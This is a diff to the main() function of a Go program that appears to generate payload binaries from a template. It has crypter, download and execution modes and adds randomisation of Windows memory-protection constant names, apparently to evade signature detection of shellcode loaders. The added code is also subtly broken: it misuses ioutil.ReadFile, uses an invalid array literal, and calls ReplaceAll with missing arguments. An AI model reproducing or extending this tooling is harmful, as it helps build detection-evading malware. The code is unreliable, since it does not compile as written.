@@ -198,7 +198,7 @@ func main() {
 	crypter_mode = strings.ToLower(crypter_mode)
 	download_mode = strings.ToLower(download_mode)
 	execution_mode = strings.ToLower(execution_mode)
-	
+
 	log.SetFormatter(&log.JSONFormatter{})
 	log.SetLevel(log.InfoLevel)
 
@@ -273,12 +273,12 @@ func main() {
 	// insert remaining data into templates
 	// create randomization string, insert into template
 	randomizer := RandStringBytes(12)
-	
+
 	template_file := "./templates/1.template"
 	tmp_go_file := "./tmp.go"
 
 	content, _ := ioutil.ReadFile(template_file)
-	//lines := strings.Split(string(content), "\n")
+
 	new_content := strings.ReplaceAll(string(content), "{{RANDOMIZER}}", "\"" + randomizer + "\"")
 	new_content = strings.ReplaceAll(new_content, "{{CRYPTER_MODE}}", "\"" + crypter_mode + "\"")
 	new_content = strings.ReplaceAll(new_content, "{{DOWNLOAD_MODE}}", "\"" + download_mode + "\"")
@@ -300,10 +300,20 @@ func main() {
 	}
 
 	log.Info("Wrote tmp file")
-	
+
+	content = string(ioutil.ReadFile(tmp_go_file))
+
+	var variable_names = [string]{"MEM_COMMIT", "MEM_RESERVE", "PAGE_EXECUTE_READ", "PAGE_READWRITE"}
+	for i := range(variable_names) {
+		new_var_name := RandStringBytes(10)
+		new_content = strings.ReplaceAll(variable_names[i], new_var_name)
+	}
+
 	// if randomization, randomize variable names in template
 	// generate binary
 	BuildPayload()
 
-	// print out all relevent information to console
+	// delete tmp file
+
+	// print relevant information to the console
 }
